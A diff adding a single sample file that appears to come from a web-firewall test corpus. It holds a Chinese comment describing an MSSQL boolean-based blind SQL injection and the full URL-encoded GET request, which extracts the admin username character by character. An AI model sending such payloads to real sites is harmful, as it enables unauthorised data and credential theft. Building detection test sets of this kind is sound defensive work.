@@ -1,0 +1,9 @@
+# SQL注入_GET_mssql_布尔注入-06506445
+# 攻击者基于布尔查询，将"exists(select * from sysobjects)"语句注入到 SQL 查询参数中，使用substring提取username每个字母进行逐个进行判断最后得出整个username字符串。
+GET /?id=1%20and%20exists%28select%20id%20from%20mydb..admin%20where%20unicode%28substring%28username%2C1%2C1%29%29=65%20and%20id%20=1%29&bid=hd_tag_m8mv26mx HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26mx
+RM-PRO-Token: 375eb8a57807fd9719a19281b196638c
+RM-PRO-Time: 1742808638564
+User-Agent: curl/7.83.1
+
